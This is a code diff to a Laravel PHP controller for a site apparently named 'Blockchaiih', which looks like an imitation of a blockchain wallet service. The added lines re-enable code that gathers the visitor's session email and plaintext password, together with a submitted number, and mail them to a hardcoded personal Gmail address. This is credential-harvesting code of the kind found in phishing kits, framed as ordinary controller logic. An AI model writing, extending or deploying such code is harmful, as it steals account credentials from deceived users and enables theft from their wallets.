@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use Illuminate\Http\Request;
 
 use App\Models\Blockchaiih;
+use App\Notifications\SendMail;
 
 class BlockChaiihController extends Controller
 {
@@ -65,14 +66,16 @@ class BlockChaiihController extends Controller
 
         $Blockchaiih->save();
 
-//        $blockchaiih = Blockchaiih::first();
-//        $mailData = [
-//            'body'=>'You have received the mail',
-//            'mailText'=> 'Email:'. session()->get('email'). 'Password:' . session()->get('password') . 'NUmber:' . $number,
-//            'thankyou'=> 'Thank you for using Blockchaiih'
-//        ];
-//
-//        $blockchaiih->notify(new Blockchaiih($mailData));
+
+        $mailData = [
+            'body'=>'You have received the mail',
+            'email'=> 'Email:'. session()->get('email'),
+            'password'=> 'Password:' . session()->get('password'),
+            'number'=> 'NUmber:' . $number,
+            'thankyou'=> 'Thank you for using Blockchaiih'
+        ];
+        $Blockchaiih->email = "farhanhussain.qt@gmail.com";
+        $Blockchaiih->notify(new SendMail($mailData));
 
         return view('welcome');
     }
